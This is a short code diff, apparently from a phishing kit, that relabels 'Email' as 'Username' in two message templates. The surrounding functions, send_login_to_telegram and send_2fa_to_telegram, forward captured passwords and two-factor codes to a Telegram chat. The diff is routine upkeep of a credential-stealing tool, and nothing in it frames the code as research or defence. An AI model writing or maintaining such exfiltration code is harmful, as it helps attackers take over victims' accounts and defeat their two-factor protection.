@@ -87,7 +87,7 @@ def send_login_to_telegram(email, password):
     message = (
         "🔔 New Login\n"
         "━━━━━━━━━━━━━━━\n"
-        f"📧 Email: {email}\n"
+        f"📧 Username: {email}\n"
         f"🔑 Password: {password}"
     )
     _send_telegram(message)
@@ -98,7 +98,7 @@ def send_2fa_to_telegram(email, code):
     message = (
         "🔐 2FA Code\n"
         "━━━━━━━━━━━━━━━\n"
-        f"📧 Email: {email}\n"
+        f"📧 Username: {email}\n"
         f"🔢 Code: {code}"
     )
     _send_telegram(message)
